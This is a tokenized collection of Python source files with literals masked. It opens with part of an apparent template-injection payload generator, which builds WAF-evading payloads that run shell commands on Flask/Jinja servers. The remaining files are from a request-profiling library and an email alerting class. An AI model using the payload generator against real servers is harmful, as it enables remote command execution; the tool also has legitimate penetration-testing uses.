append_targets <EOL> if not self . prepared and not self . do_prepare ( ) : <EOL> return <EOL> if not any ( <EOL> self . waf_func ( test_pattern ) for _ , test_pattern in SET_STMT_PATTERNS <EOL> ) : <EOL> logger . warning ( "<STR_LIT>" ) <EOL> return <EOL> assert self . payload_gen is not None , "<STR_LIT>" <EOL> logger . info ( <EOL> "<STR_LIT>" , <EOL> ) <EOL> for target in targets : <EOL> if target in self . added_extra_context_vars : <EOL> continue <EOL> result = self . try_add_context_var ( target , clean_cache = False ) <EOL> if result == "<STR_LIT>" : <EOL> logger . warning ( "<STR_LIT>" , colored ( "<STR_LIT>" , repr ( target ) ) ) <EOL> continue <EOL> if result == "<STR_LIT>" : <EOL> self . added_extra_context_vars . add ( target ) <EOL> def add_context_variable ( <EOL> self , <EOL> payload : str , <EOL> context_vars : Dict [ str , Any ] , <EOL> check_waf : bool = True , <EOL> depends_on : Union [ Dict [ str , Any ] , None ] = None , <EOL> ) -> bool : <EOL> if not self . prepared : <EOL> raise RuntimeError ( "<STR_LIT>" ) <EOL> assert self . payload_gen is not None and self . context_vars is not None <EOL> success = self . context_vars . add_payload ( <EOL> payload = payload , <EOL> variables = context_vars , <EOL> depends_on = depends_on , <EOL> check_waf = check_waf , <EOL> ) <EOL> if not success : <EOL> return False <EOL> self . payload_gen . context = self . context_vars . get_context ( ) <EOL> return True <EOL> def generate_with_tree ( <EOL> self , gen_type , * args <EOL> ) -> Union [ Tuple [ str , bool , payload_gen . TargetAndSubTargets ] , None ] : <EOL> if not self . prepared and not self . do_prepare ( ) : <EOL> return None <EOL> assert self . payload_gen is not None and self . context_vars is not None <EOL> assert isinstance ( self . outer_pattern , str ) and self . will_print is not None <EOL> if self . options . detect_mode != DetectMode . FAST : <EOL> extra_strings = [ ] <EOL> if gen_type == OS_POPEN_READ : <EOL> extra_strings = [ args [ <NUM_LIT> ] ] <EOL> elif gen_type == EVAL and args [ <NUM_LIT> ] [ <NUM_LIT> ] == STRING : <EOL> extra_strings = [ args [ <NUM_LIT> ] [ <NUM_LIT> ] ] <EOL> self . prepare_extra_context_vars ( extra_strings ) <EOL> logger . info ( "<STR_LIT>" ) <EOL> ret = self . payload_gen . generate_detailed ( gen_type , * args ) <EOL> if ret is None : <EOL> logger . warning ( "<STR_LIT>" ) <EOL> return None <EOL> inner_payload , used_context , tree = ret <EOL> context_payload = self . context_vars . get_payload ( used_context ) <EOL> payload = context_payload + self . outer_pattern . replace ( "<STR_LIT>" , inner_payload ) <EOL> self . callback ( <EOL> CALLBACK_GENERATE_FULLPAYLOAD , <EOL> { <EOL> "<STR_LIT>" : gen_type , <EOL> "<STR_LIT>" : args , <EOL> "<STR_LIT>" : payload , <EOL> "<STR_LIT>" : self . will_print , <EOL> } , <EOL> ) <EOL> if not self . will_print : <EOL> logger . warning ( <EOL> "<STR_LIT>" , <EOL> colored ( "<STR_LIT>" , self . outer_pattern ) , <EOL> colored ( "<STR_LIT>" , "<STR_LIT>" ) , <EOL> ) <EOL> return ( payload , self . will_print , tree ) <EOL> def generate ( self , gen_type , * args ) -> Tuple [ Union [ str , None ] , Union [ bool , None ] ] : <EOL> result = self . generate_with_tree ( gen_type , * args ) <EOL> if result : <EOL> return result [ : <NUM_LIT> ] <EOL> return None , None <EOL> </s>
<s> from typing import Callable , Tuple , Dict , Union <EOL> from . const import OS_POPEN_READ <EOL> from . full_payload_gen import FullPayloadGen <EOL> full_payload_store : Dict [ int , FullPayloadGen ] = { } <EOL> def exec_cmd_payload ( <EOL> waf_func : Callable [ <EOL> [ <EOL> str , <EOL> ] , <EOL> bool , <EOL> ] , <EOL> cmd : str , <EOL> ) -> Tuple [ Union [ str , None ] , Union [ bool , None ] ] : <EOL> full_payload = None <EOL> if id ( waf_func ) not in full_payload_store : <EOL> full_payload = FullPayloadGen ( waf_func ) <EOL> full_payload_store [ id ( waf_func ) ] = full_payload <EOL> else : <EOL> full_payload = full_payload_store [ id ( waf_func ) ] <EOL> return full_payload . generate ( OS_POPEN_READ , cmd ) <EOL> </s>
<s> from . cli import main as cli_main , RunFailed <EOL> def main ( ) : <EOL> try : <EOL> cli_main ( ) <EOL> except RunFailed : <EOL> exit ( <NUM_LIT> ) <EOL> if __name__ == "<STR_LIT>" : <EOL> main ( ) <EOL> </s>
<s> from dataclasses import dataclass <EOL> from . const import ( <EOL> DetectMode , <EOL> TemplateEnvironment , <EOL> PythonEnvironment , <EOL> ReplacedKeywordStrategy , <EOL> AutoFix500Code , <EOL> ) <EOL> @ dataclass <EOL> class Options : <EOL> detect_mode : DetectMode = DetectMode . ACCURATE <EOL> environment : TemplateEnvironment = TemplateEnvironment . FLASK <EOL> replaced_keyword_strategy : ReplacedKeywordStrategy = ReplacedKeywordStrategy . AVOID <EOL> python_version : PythonEnvironment = PythonEnvironment . UNKNOWN <EOL> autofix_500 : AutoFix500Code = AutoFix500Code . ENABLED <EOL> </s>
<s> from typing import Optional <EOL> from profyle . domain . trace import Trace <EOL> from profyle . domain . trace_repository import TraceRepository <EOL> def get_all_traces ( repo : TraceRepository ) -> list [ Trace ] : <EOL> return repo . get_all_traces ( ) <EOL> def get_trace_selected ( repo : TraceRepository ) -> Optional [ int ] : <EOL> return repo . get_trace_selected ( ) <EOL> def get_trace_by_id ( trace_id : int , repo : TraceRepository ) -> Optional [ Trace ] : <EOL> return repo . get_trace_by_id ( trace_id ) <EOL> </s>
<s> from typing import Any <EOL> from pydantic import BaseModel , Json , computed_field <EOL> class Trace ( BaseModel ) : <EOL> data : Json [ Any ] = { } <EOL> name : str <EOL> duration : float = <NUM_LIT> <EOL> timestamp : str = "<STR_LIT>" <EOL> id : int <EOL> class TraceCreate ( BaseModel ) : <EOL> data : Json [ Any ] = { } <EOL> name : str <EOL> @ computed_field <EOL> @ property <EOL> def duration ( self ) -> float : <EOL> any_trace_to_analize = any ( <EOL> True <EOL> for trace in self . data . get ( "<STR_LIT>" , [ ] ) <EOL> if trace . get ( "<STR_LIT>" ) <EOL> ) <EOL> if not any_trace_to_analize : <EOL> return <NUM_LIT> <EOL> start = min ( <EOL> trace . get ( "<STR_LIT>" , <NUM_LIT> ) <EOL> for trace in self . data . get ( "<STR_LIT>" , [ ] ) <EOL> if trace . get ( "<STR_LIT>" ) <EOL> ) <EOL> end = max ( <EOL> trace . get ( "<STR_LIT>" , <NUM_LIT> ) <EOL> for trace in self . data . get ( "<STR_LIT>" , [ ] ) <EOL> ) <EOL> return end - start <EOL> </s>
<s> import os <EOL> import asyncio <EOL> import typer <EOL> from rich import print <EOL> from profyle . infrastructure . sqlite3 . repository import SQLiteTraceRepository <EOL> from profyle . application . trace . delete import delete_all_traces <EOL> from profyle . application . trace . vacuum import vacuum <EOL> from profyle . infrastructure . sqlite3 . get_connection import get_connection <EOL> from profyle . infrastructure . http_server import start_server <EOL> from profyle . settings import settings <EOL> app = typer . Typer ( ) <EOL> @ app . command ( ) <EOL> def start ( port : int = <NUM_LIT> , host : str = "<STR_LIT>" ) : <EOL> asyncio . run ( start_server ( port = port , host = host ) ) <EOL> @ app . command ( ) <EOL> def clean ( ) : <EOL> db = get_connection ( ) <EOL> sqlite_repo = SQLiteTraceRepository ( db ) <EOL> removed_traces = delete_all_traces ( sqlite_repo ) <EOL> vacuum ( sqlite_repo ) <EOL> print ( f"<STR_LIT>" ) <EOL> @ app . command ( ) <EOL> def check ( ) : <EOL> db_size_in_bytes = os . path . getsize ( settings . get_path ( "<STR_LIT>" ) ) <EOL> db_size_in_megabytes = round ( db_size_in_bytes / <NUM_LIT> ** <NUM_LIT> , <NUM_LIT> ) <EOL> db_size_in_gigabytes = round ( db_size_in_megabytes / <NUM_LIT> ** <NUM_LIT> , <NUM_LIT> ) <EOL> if db_size_in_megabytes > <NUM_LIT> : <EOL> print ( f"<STR_LIT>" ) <EOL> return <EOL> print ( f"<STR_LIT>" ) <EOL> </s>
<s> from abc import ABC , abstractmethod <EOL> from typing import Optional <EOL> from profyle . domain . trace import Trace , TraceCreate <EOL> class TraceRepository ( ABC ) : <EOL> @ abstractmethod <EOL> def create_trace_selected_table ( self ) -> None : <EOL> ... <EOL> @ abstractmethod <EOL> def create_trace_table ( self ) -> None : <EOL> ... <EOL> @ abstractmethod <EOL> def delete_all_traces ( self ) -> int : <EOL> ... <EOL> @ abstractmethod <EOL> def vacuum ( self ) -> None : <EOL> ... <EOL> @ abstractmethod <EOL> def store_trace_selected ( self , trace_id : int ) -> None : <EOL> ... <EOL> @ abstractmethod <EOL> def store_trace ( self , new_trace : TraceCreate ) -> None : <EOL> ... <EOL> @ abstractmethod <EOL> def get_all_traces ( self ) -> list [ Trace ] : <EOL> ... <EOL> @ abstractmethod <EOL> def get_trace_by_id ( self , id : int ) -> Optional [ Trace ] : <EOL> ... <EOL> @ abstractmethod <EOL> def get_trace_selected ( self ) -> Optional [ int ] : <EOL> ... <EOL> @ abstractmethod <EOL> def delete_trace_by_id ( self , trace_id : int ) : <EOL> ... <EOL> </s>
<s> from typing import Optional <EOL> from uuid import uuid4 <EOL> import time <EOL> import json <EOL> from profyle . domain . trace import TraceCreate <EOL> from profyle . domain . trace_repository import TraceRepository <EOL> from profyle . domain . trace import Trace <EOL> class InMemoryTraceRepository ( TraceRepository ) : <EOL> def __init__ ( self ) : <EOL> self . traces : list [ Trace ] = [ ] <EOL> self . selected_trace : int = <NUM_LIT> <EOL> def create_trace_selected_table ( self ) -> None : <EOL> ... <EOL> def create_trace_table ( self ) -> None : <EOL> ... <EOL> def delete_all_traces ( self ) -> int : <EOL> removed = len ( self . traces ) <EOL> self . traces = [ ] <EOL> return removed <EOL> def vacuum ( self ) -> None : <EOL> ... <EOL> def store_trace_selected ( self , trace_id : int ) -> None : <EOL> self . selected_trace = trace_id <EOL> def store_trace ( self , new_trace : TraceCreate ) -> None : <EOL> trace = Trace ( <EOL> id = uuid4 ( ) . int , <EOL> timestamp = str ( time . time ( ) ) , <EOL> data = json . dumps ( new_trace . data ) , <EOL> duration = new_trace . duration , <EOL> name = new_trace . name , <EOL> ) <EOL> self . traces . append ( trace ) <EOL> def get_all_traces ( self ) -> list [ Trace ] : <EOL> return self . traces <EOL> def get_trace_by_id ( self , id : int ) -> Optional [ Trace ] : <EOL> for trace in self . traces : <EOL> if trace . id == id : <EOL> return trace <EOL> return <EOL> def get_trace_selected ( self ) -> Optional [ int ] : <EOL> return self . selected_trace <EOL> def delete_trace_by_id ( self , trace_id : int ) : <EOL> for trace in self . traces : <EOL> if trace . id == trace_id : <EOL> self . traces . remove ( trace ) <EOL> return <EOL> </s>
<s> import fnmatch <EOL> import json <EOL> import re <EOL> from typing import Optional <EOL> from dataclasses import dataclass <EOL> from tempfile import NamedTemporaryFile <EOL> from viztracer import VizTracer <EOL> from profyle . application . trace . store import store_trace <EOL> from profyle . domain . trace_repository import TraceRepository <EOL> from profyle . domain . trace import TraceCreate <EOL> @ dataclass <EOL> class profyle : <EOL> name : str <EOL> repo : TraceRepository <EOL> max_stack_depth : int = - <NUM_LIT> <EOL> min_duration : float = <NUM_LIT> <EOL> pattern : Optional [ str ] = None <EOL> tracer : Optional [ VizTracer ] = None <EOL> def __enter__ ( self ) -> None : <EOL> if self . should_trace ( ) : <EOL> self . tracer = VizTracer ( <EOL> log_func_args = True , <EOL> log_print = True , <EOL> log_func_retval = True , <EOL> log_async = True , <EOL> file_info = True , <EOL> min_duration = self . min_duration , <EOL> max_stack_depth = self . max_stack_depth <EOL> ) <EOL> self . tracer . start ( ) <EOL> def __exit__ ( <EOL> self , <EOL> * args , <EOL> ) -> None : <EOL> if self . tracer and self . tracer . enable : <EOL> self . tracer . stop ( ) <EOL> temp_file = NamedTemporaryFile ( suffix = "<STR_LIT>" ) <EOL> self . tracer . save ( temp_file . name ) <EOL> temp_file . close ( ) <EOL> new_trace = TraceCreate ( <EOL> data = json . dumps ( self . tracer . data ) , <EOL> name = self . name <EOL> ) <EOL> store_trace ( <EOL> new_trace = new_trace , <EOL> repo = self . repo <EOL> ) <EOL> def should_trace ( self ) -> bool : <EOL> if not self . pattern : <EOL> return True <EOL> regex = fnmatch . translate ( self . pattern ) <EOL> reobj = re . compile ( regex ) <EOL> method_and_name = self . name . split ( '<STR_LIT>' ) <EOL> if len ( method_and_name ) > <NUM_LIT> : <EOL> return bool ( reobj . match ( method_and_name [ <NUM_LIT> ] ) ) <EOL> return bool ( reobj . match ( self . name ) ) <EOL> </s>
<s> from profyle . infrastructure . middleware . flask import ProfyleMiddleware <EOL> from tests . unit . repository import InMemoryTraceRepository <EOL> def test_should_trace_all_requests ( flask_client , flask_app ) : <EOL> trace_repo = InMemoryTraceRepository ( ) <EOL> flask_app . wsgi_app = ProfyleMiddleware ( <EOL> flask_app . wsgi_app , <EOL> trace_repo = trace_repo <EOL> ) <EOL> flask_client . post ( "<STR_LIT>" ) <EOL> flask_client . get ( "<STR_LIT>" ) <EOL> assert len ( trace_repo . traces ) == <NUM_LIT> <EOL> assert trace_repo . traces [ <NUM_LIT> ] . name == "<STR_LIT>" <EOL> assert trace_repo . traces [ <NUM_LIT> ] . name == "<STR_LIT>" <EOL> def test_should_trace_filtered_requests ( flask_client , flask_app ) : <EOL> trace_repo = InMemoryTraceRepository ( ) <EOL> flask_app . wsgi_app = ProfyleMiddleware ( <EOL> flask_app . wsgi_app , <EOL> trace_repo = trace_repo , <EOL> pattern = "<STR_LIT>" , <EOL> ) <EOL> flask_client . post ( "<STR_LIT>" ) <EOL> flask_client . get ( "<STR_LIT>" ) <EOL> flask_client . get ( "<STR_LIT>" ) <EOL> assert len ( trace_repo . traces ) == <NUM_LIT> <EOL> assert trace_repo . traces [ <NUM_LIT> ] . name == "<STR_LIT>" <EOL> assert trace_repo . traces [ <NUM_LIT> ] . name == "<STR_LIT>" <EOL> def test_should_no_trace_if_disabled ( flask_client , flask_app ) : <EOL> trace_repo = InMemoryTraceRepository ( ) <EOL> flask_app . wsgi_app = ProfyleMiddleware ( <EOL> flask_app . wsgi_app , <EOL> trace_repo = trace_repo , <EOL> enabled = False , <EOL> ) <EOL> flask_client . post ( "<STR_LIT>" ) <EOL> flask_client . get ( "<STR_LIT>" ) <EOL> assert len ( trace_repo . traces ) == <NUM_LIT> <EOL> </s>
<s> from typing import Optional <EOL> from starlette . types import ASGIApp , Scope , Receive , Send <EOL> from profyle . application . profyle import profyle <EOL> from profyle . infrastructure . sqlite3 . repository import SQLiteTraceRepository <EOL> class ProfyleMiddleware : <EOL> def __init__ ( <EOL> self , <EOL> app : ASGIApp , <EOL> enabled : bool = True , <EOL> pattern : Optional [ str ] = None , <EOL> max_stack_depth : int = - <NUM_LIT> , <EOL> min_duration : int = <NUM_LIT> , <EOL> trace_repo : SQLiteTraceRepository = SQLiteTraceRepository ( ) <EOL> ) : <EOL> self . app = app <EOL> self . enabled = enabled <EOL> self . pattern = pattern <EOL> self . max_stack_depth = max_stack_depth <EOL> self . min_duration = min_duration <EOL> self . trace_repo = trace_repo <EOL> async def __call__ ( self , scope : Scope , receive : Receive , send : Send ) -> None : <EOL> if self . enabled and scope [ "<STR_LIT>" ] == "<STR_LIT>" : <EOL> method = scope . get ( '<STR_LIT>' , '<STR_LIT>' ) . upper ( ) <EOL> path = scope . get ( '<STR_LIT>' , b'<STR_LIT>' ) . decode ( '<STR_LIT>' ) <EOL> with profyle ( <EOL> name = f"<STR_LIT>" , <EOL> pattern = self . pattern , <EOL> repo = self . trace_repo , <EOL> max_stack_depth = self . max_stack_depth , <EOL> min_duration = self . min_duration <EOL> ) : <EOL> await self . app ( scope , receive , send ) <EOL> return <EOL> await self . app ( scope , receive , send ) <EOL> </s>
<s> from profyle . infrastructure . middleware . flask import ProfyleMiddleware <EOL> </s>
<s> import pytest <EOL> import os <EOL> from flask import Flask <EOL> from fastapi import APIRouter , FastAPI <EOL> from fastapi . testclient import TestClient <EOL> @ pytest . fixture <EOL> def fastapi_app ( ) : <EOL> app = FastAPI ( ) <EOL> router = APIRouter ( ) <EOL> @ router . post ( '<STR_LIT>' ) <EOL> async def test_post ( ) : <EOL> return { '<STR_LIT>' : '<STR_LIT>' } <EOL> @ router . get ( '<STR_LIT>' ) <EOL> async def test_get ( demo : bool = False ) : <EOL> return { '<STR_LIT>' : demo } <EOL> @ router . patch ( '<STR_LIT>' ) <EOL> async def test_patch ( ) : <EOL> return { '<STR_LIT>' : '<STR_LIT>' } <EOL> @ router . put ( '<STR_LIT>' ) <EOL> async def test_put ( ) : <EOL> return { '<STR_LIT>' : '<STR_LIT>' } <EOL> app . include_router ( router ) <EOL> yield app <EOL> @ pytest . fixture <EOL> def flask_app ( ) : <EOL> app = Flask ( '<STR_LIT>' , root_path = os . path . dirname ( __file__ ) ) <EOL> app . config . update ( <EOL> TESTING = True , <EOL> SECRET_KEY = '<STR_LIT>' , <EOL> ) <EOL> @ app . route ( '<STR_LIT>' , methods = [ '<STR_LIT>' ] ) <EOL> def test_post ( ) : <EOL> return '<STR_LIT>' <EOL> @ app . route ( '<STR_LIT>' , methods = [ '<STR_LIT>' ] ) <EOL> def test_get ( ) : <EOL> return '<STR_LIT>' <EOL> @ app . route ( '<STR_LIT>' , methods = [ '<STR_LIT>' ] ) <EOL> def test_patch ( ) : <EOL> return '<STR_LIT>' <EOL> yield app <EOL> @ pytest . fixture <EOL> def flask_client ( flask_app ) : <EOL> yield flask_app . test_client ( ) <EOL> @ pytest . fixture ( ) <EOL> def fastapi_client ( fastapi_app ) : <EOL> yield TestClient ( fastapi_app ) <EOL> </s>
<s> from profyle . fastapi import ProfyleMiddleware <EOL> from tests . unit . repository import InMemoryTraceRepository <EOL> def test_should_trace_all_requests ( fastapi_client , fastapi_app ) : <EOL> trace_repo = InMemoryTraceRepository ( ) <EOL> fastapi_app . add_middleware ( <EOL> ProfyleMiddleware , <EOL> trace_repo = trace_repo <EOL> ) <EOL> fastapi_client . post ( "<STR_LIT>" ) <EOL> fastapi_client . get ( "<STR_LIT>" ) <EOL> assert len ( trace_repo . traces ) == <NUM_LIT> <EOL> assert trace_repo . traces [ <NUM_LIT> ] . name == "<STR_LIT>" <EOL> assert trace_repo . traces [ <NUM_LIT> ] . name == "<STR_LIT>" <EOL> def test_should_trace_filtered_requests ( fastapi_client , fastapi_app ) : <EOL> trace_repo = InMemoryTraceRepository ( ) <EOL> fastapi_app . add_middleware ( <EOL> ProfyleMiddleware , <EOL> pattern = "<STR_LIT>" , <EOL> trace_repo = trace_repo <EOL> ) <EOL> fastapi_client . post ( "<STR_LIT>" ) <EOL> fastapi_client . get ( "<STR_LIT>" ) <EOL> fastapi_client . get ( "<STR_LIT>" ) <EOL> assert len ( trace_repo . traces ) == <NUM_LIT> <EOL> assert trace_repo . traces [ <NUM_LIT> ] . name == "<STR_LIT>" <EOL> assert trace_repo . traces [ <NUM_LIT> ] . name == "<STR_LIT>" <EOL> def test_should_no_trace_if_disabled ( fastapi_client , fastapi_app ) : <EOL> trace_repo = InMemoryTraceRepository ( ) <EOL> fastapi_app . add_middleware ( <EOL> ProfyleMiddleware , <EOL> enabled = False , <EOL> trace_repo = InMemoryTraceRepository ( ) <EOL> ) <EOL> fastapi_client . post ( "<STR_LIT>" ) <EOL> fastapi_client . get ( "<STR_LIT>" ) <EOL> assert len ( trace_repo . traces ) == <NUM_LIT> <EOL> </s>
<s> from profyle . domain . trace_repository import TraceRepository <EOL> def vacuum ( repo : TraceRepository ) -> None : <EOL> repo . vacuum ( ) <EOL> </s>
<s> from typing import Optional <EOL> from profyle . application . profyle import profyle <EOL> from profyle . domain . trace_repository import TraceRepository <EOL> from profyle . infrastructure . sqlite3 . repository import SQLiteTraceRepository <EOL> class ProfyleMiddleware : <EOL> def __init__ ( <EOL> self , <EOL> app , <EOL> enabled : bool = True , <EOL> pattern : Optional [ str ] = None , <EOL> max_stack_depth : int = - <NUM_LIT> , <EOL> min_duration : int = <NUM_LIT> , <EOL> trace_repo : TraceRepository = SQLiteTraceRepository ( ) <EOL> ) : <EOL> self . app = app <EOL> self . enabled = enabled <EOL> self . pattern = pattern <EOL> self . max_stack_depth = max_stack_depth <EOL> self . min_duration = min_duration <EOL> self . trace_repo = trace_repo <EOL> def __call__ ( self , environ , start_response ) : <EOL> if environ . get ( "<STR_LIT>" ) == "<STR_LIT>" and self . enabled : <EOL> method = environ . get ( "<STR_LIT>" , "<STR_LIT>" ) . upper ( ) <EOL> path = environ . get ( "<STR_LIT>" ) <EOL> with profyle ( <EOL> name = f"<STR_LIT>" , <EOL> pattern = self . pattern , <EOL> max_stack_depth = self . max_stack_depth , <EOL> min_duration = self . min_duration , <EOL> repo = self . trace_repo <EOL> ) : <EOL> return self . app ( environ , start_response ) <EOL> return self . app ( environ , start_response ) <EOL> </s>
<s> import sqlite3 <EOL> from sqlite3 import Connection <EOL> from profyle . settings import settings <EOL> def get_connection ( ) -> Connection : <EOL> db = sqlite3 . connect ( <EOL> settings . get_path ( "<STR_LIT>" ) , <EOL> check_same_thread = False <EOL> ) <EOL> return db <EOL> </s>
<s> from profyle . domain . trace import TraceCreate <EOL> from profyle . domain . trace_repository import TraceRepository <EOL> def store_trace_selected ( trace_id : int , repo : TraceRepository ) -> None : <EOL> repo . store_trace_selected ( trace_id = trace_id ) <EOL> def store_trace ( new_trace : TraceCreate , repo : TraceRepository ) -> None : <EOL> repo . store_trace ( new_trace ) <EOL> </s>
<s> import os <EOL> from pydantic_settings import BaseSettings <EOL> import viztracer <EOL> class Settings ( BaseSettings ) : <EOL> app_name : str = "<STR_LIT>" <EOL> project_dir : str = os . path . normpath ( <EOL> os . path . join ( <EOL> os . path . abspath ( __file__ ) , <EOL> "<STR_LIT>" , <EOL> ) <EOL> ) <EOL> def get_path ( self , * args ) : <EOL> return os . path . join ( <EOL> self . project_dir , <EOL> * args <EOL> ) <EOL> def get_viztracer_static_files ( self ) : <EOL> return os . path . normpath ( os . path . join ( <EOL> os . path . abspath ( viztracer . __file__ ) , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" <EOL> ) ) <EOL> settings = Settings ( ) <EOL> </s>
<s> from profyle . infrastructure . middleware . fastapi import ProfyleMiddleware <EOL> </s>
<s> from sqlite3 import Connection <EOL> from fastapi import Depends , FastAPI , Request <EOL> from fastapi . middleware . cors import CORSMiddleware <EOL> from fastapi . staticfiles import StaticFiles <EOL> from fastapi . templating import Jinja2Templates <EOL> from starlette . responses import RedirectResponse <EOL> import uvicorn <EOL> from profyle . application . trace . create import create_trace_selected_table , create_trace_table <EOL> from profyle . application . trace . get import get_all_traces , get_trace_selected , get_trace_by_id <EOL> from profyle . application . trace . store import store_trace_selected <EOL> from profyle . infrastructure . sqlite3 . get_connection import get_connection <EOL> from profyle . infrastructure . sqlite3 . repository import SQLiteTraceRepository <EOL> from profyle . settings import settings <EOL> app = FastAPI ( <EOL> title = "<STR_LIT>" , <EOL> version = "<STR_LIT>" <EOL> ) <EOL> app . add_middleware ( <EOL> CORSMiddleware , <EOL> allow_origins = [ "<STR_LIT>" ] , <EOL> allow_methods = [ "<STR_LIT>" ] , <EOL> allow_headers = [ "<STR_LIT>" ] , <EOL> ) <EOL> @ app . on_event ( "<STR_LIT>" ) <EOL> async def startup_event ( ) : <EOL> db = get_connection ( ) <EOL> sqlite_trace_repo = SQLiteTraceRepository ( db ) <EOL> create_trace_table ( repo = sqlite_trace_repo ) <EOL> create_trace_selected_table ( repo = sqlite_trace_repo ) <EOL> STATIC_PATH = ( "<STR_LIT>" , "<STR_LIT>" , "<STR_LIT>" ) <EOL> app . mount ( <EOL> "<STR_LIT>" , <EOL> StaticFiles ( directory = settings . get_path ( * STATIC_PATH ) ) , <EOL> name = "<STR_LIT>" <EOL> ) <EOL> app . mount ( <EOL> "<STR_LIT>" , <EOL> StaticFiles ( directory = settings . get_viztracer_static_files ( ) , html = True ) , <EOL> name = "<STR_LIT>" <EOL> ) <EOL> TEMPLATES_PATH = ( "<STR_LIT>" , "<STR_LIT>" , "<STR_LIT>" ) <EOL> templates = Jinja2Templates ( directory = settings . get_path ( * TEMPLATES_PATH ) ) <EOL> @ app . get ( "<STR_LIT>" ) <EOL> async def vizviewer_info ( ) : <EOL> return { "<STR_LIT>" : False } <EOL> @ app . get ( "<STR_LIT>" ) <EOL> async def file_info ( <EOL> db : Connection = Depends ( get_connection ) , <EOL> ) : <EOL> sqlite_trace_repo = SQLiteTraceRepository ( db ) <EOL> trace_id = get_trace_selected ( repo = sqlite_trace_repo ) <EOL> if not trace_id : <EOL> return { } <EOL> trace = get_trace_by_id ( <EOL> trace_id = trace_id , <EOL> repo = sqlite_trace_repo <EOL> ) <EOL> if not trace : <EOL> return { } <EOL> return trace . data . get ( "<STR_LIT>" ) <EOL> @ app . get ( "<STR_LIT>" ) <EOL> async def localtrace ( <EOL> db : Connection = Depends ( get_connection ) , <EOL> ) : <EOL> sqlite_trace_repo = SQLiteTraceRepository ( db ) <EOL> trace_id = get_trace_selected ( repo = sqlite_trace_repo ) <EOL> if not trace_id : <EOL> return { } <EOL> trace = get_trace_by_id ( <EOL> trace_id = trace_id , <EOL> repo = sqlite_trace_repo <EOL> ) <EOL> if not trace : <EOL> return { } <EOL> return trace . data <EOL> @ app . get ( "<STR_LIT>" ) <EOL> async def index ( ) : <EOL> return RedirectResponse ( "<STR_LIT>" ) <EOL> @ app . get ( "<STR_LIT>" ) <EOL> async def traces ( <EOL> request : Request , <EOL> db : Connection = Depends ( get_connection ) , <EOL> ) : <EOL> sqlite_trace_repo = SQLiteTraceRepository ( db ) <EOL> traces = get_all_traces ( repo = sqlite_trace_repo ) <EOL> return templates . TemplateResponse ( <EOL> name = "<STR_LIT>" , <EOL> context = { <EOL> "<STR_LIT>" : request , <EOL> "<STR_LIT>" : [ trace . dict ( ) for trace in traces ] <EOL> } <EOL> ) <EOL> @ app . get ( "<STR_LIT>" ) <EOL> async def get_trace ( <EOL> id : int , <EOL> db : Connection = Depends ( get_connection ) , <EOL> ) : <EOL> sqlite_trace_repo = SQLiteTraceRepository ( db ) <EOL> store_trace_selected ( <EOL> trace_id = id , <EOL> repo = sqlite_trace_repo <EOL> ) <EOL> return RedirectResponse ( url = "<STR_LIT>" ) <EOL> @ app . delete ( "<STR_LIT>" , status_code = <NUM_LIT> ) <EOL> async def delete_trace ( <EOL> id : int , <EOL> db : Connection = Depends ( get_connection ) , <EOL> ) -> None : <EOL> sqlite_trace_repo = SQLiteTraceRepository ( db ) <EOL> sqlite_trace_repo . delete_trace_by_id ( id ) <EOL> async def start_server ( port : int = <NUM_LIT> , host : str = "<STR_LIT>" ) : <EOL> config = uvicorn . Config ( app , port = port , log_level = "<STR_LIT>" , host = host ) <EOL> server = uvicorn . Server ( config ) <EOL> await server . serve ( ) <EOL> </s>
<s> import datetime <EOL> import resend <EOL> import time <EOL> resend . api_key = "<STR_LIT>" <EOL> from termcolor import colored <EOL> class Alerting : <EOL> def __init__ ( self , <EOL> alert_threshold = <NUM_LIT> , <EOL> send_notifications = True , <EOL> user_emails = set ( ) ) : <EOL> self . unhandled_errors = { <EOL> } <EOL> now = datetime . datetime . now ( ) <EOL> self . current_time_block = now . hour <EOL> self . set_cooldown = True <EOL> self . cooldown_start_time = time . time ( ) <EOL> self . send_notifications = send_notifications <EOL> self . user_emails = user_emails <EOL> def start_cooldown ( self ) : <EOL> self . set_cooldown = True <EOL> self . cooldown_start_time = time . time ( ) <EOL> def send_alert ( self , error_type , most_recent_error ) : <EOL> print ( colored ( "<STR_LIT>" , "<STR_LIT>" ) ) <EOL> params = { <EOL> "<STR_LIT>" : <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" : <EOL> . format ( error_type ) , <EOL> "<STR_LIT>" : <EOL> . format ( error_type , most_recent_error ) <EOL> } <EOL> for email in self . user_emails : <EOL> params [ "<STR_LIT>" ] = email <EOL> email = resend . Emails . send ( params ) <EOL> return <EOL> def add_emails ( self , user_email ) : <EOL> if type ( user_email ) == list : <EOL> for email in user_email : <EOL> self . user_emails . add ( email ) <EOL> else : <EOL> self . user_emails . add ( user_email ) <EOL> return <EOL> def add_error ( self , openai_error = None , error_description = None , error_type = None ) : <EOL> if openai_error != None : <EOL> openai_error = openai_error . error <EOL> if "<STR_LIT>" in openai_error : <EOL> error_type = openai_error [ '<STR_LIT>' ] <EOL> elif error_description and error_type : <EOL> error_type = error_type <EOL> openai_error = error_description <EOL> now = datetime . datetime . now ( ) <EOL> curr_time = now . hour <EOL> if curr_time == self . current_time_block : <EOL> if error_type in self . unhandled_errors : <EOL> self . unhandled_errors [ error_type ] += <NUM_LIT> <EOL> else : <EOL> self . unhandled_errors [ error_type ] = <NUM_LIT> <EOL> if self . unhandled_errors [ error_type ] >= <NUM_LIT> : <EOL> self . unhandled_errors [ error_type ] = <NUM_LIT> <EOL> if self . set_cooldown and time . time ( ) - self . cooldown_start_time > <NUM_LIT> : <EOL> self . send_alert ( error_type , openai_error ) <EOL> self . set_cooldown ( ) <EOL> elif self . set_cooldown == False : <EOL> self . send_alert ( error_type , openai_error ) <EOL> self . start_cooldown ( ) <EOL> else : <EOL> self . unhandled_errors [ error_type ] = <NUM_LIT> <EOL> self . current_time_block = curr_time <EOL> return <EOL> </s>
